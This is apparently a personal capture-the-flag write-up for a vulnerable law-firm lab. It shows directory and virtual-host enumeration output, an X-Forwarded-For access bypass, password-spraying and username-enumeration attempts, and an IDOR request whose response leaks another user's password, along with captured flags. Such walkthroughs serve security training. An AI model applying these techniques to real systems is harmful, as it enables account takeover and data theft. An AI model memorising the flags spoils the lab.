# Scope

```bash
mazer.ctfio.com
```

# Enumeration

## Dirsearch

```bash
Target: https://mazer.ctfio.com/

[05:56:24] Starting: 
[05:56:28] 301 -  178B  - /js  ->  https://mazer.ctfio.com/js/              
[05:57:13] 301 -  178B  - /css  ->  https://mazer.ctfio.com/css/              
[05:57:25] 403 -  564B  - /images/                                          
[05:57:25] 301 -  178B  - /images  ->  https://mazer.ctfio.com/images/      
[05:57:28] 403 -  564B  - /js/                                              
[05:57:31] 302 -    1KB - /login  ->  /denied                               
[05:57:31] 302 -    1KB - /login/  ->  /denied 
```

## Vhosts

```bash
data                    [Status: 200, Size: 109, Words: 3, Lines: 1, Duration: 177ms]
:: Progress: [1907/1907] :: Job [1/1] :: 146 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

![image.png](attachment:65531e1a-4fa8-42c0-b056-d97d8e06f11d:image.png)

## Website functionality

![image.png](attachment:1afb9ffa-ae39-4552-86aa-64aa2b4f35fc:image.png)

- X-Forwarded-For
- SSRF

```bash
               <p>Access to this portal can now be found here <a href=/lawyers-only">/lawyers-only</a></p>
                <p>[^FLAG^FB52470E40F47559EBA87252B2D4CF67^FLAG^]</p>
```

## Investigating `lawyers-only`  endpoint

- login form

```bash
POST /lawyers-only-login HTTP/1.1
Host: mazer.ctfio.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: https://mazer.ctfio.com
Referer: https://mazer.ctfio.com/lawyers-only-login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

email=admin&password=admin
```

- ~~SQL injection~~
- ~~NoSQL injection~~
- Password Spraying
- Username Enumeration

```bash
email=jaskaran.lowe@vulnlawyers.ctf&password=summer
```

## VulnLaywers API (data vhost)

## Dirsearch

```bash
Target: https://data.zeus.ctfio.com/

[06:48:12] Starting: 
[06:48:54] 200 -  396B  - /users
```

- `Machine time out, use next machine`
- We were able to dump the users

# Authenticated access to the portal

```bash
GET /lawyers-only-profile-details/2 HTTP/1.1
Host: zeus.ctfio.com
Cookie: token=7BCC07AAE3CCD9CD66223DF6D6932582
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Referer: https://zeus.ctfio.com/lawyers-only-profile
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive
```

- This endpoint is vulnerable to IDOR on the ID parameter that exposes victim’s full passwords

```bash
HTTP/1.1 200 OK
Server: nginx/1.22.0 (Ubuntu)
Date: Thu, 15 May 2025 11:19:45 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 155

{"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.ctf","password":"q2V944&#2a1^3p","flag":"[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]"}
```

```bash

There are no more cases

[^FLAG^B38BAE0B8B804FCB85C730F10B3B5CB5^FLAG^]
```
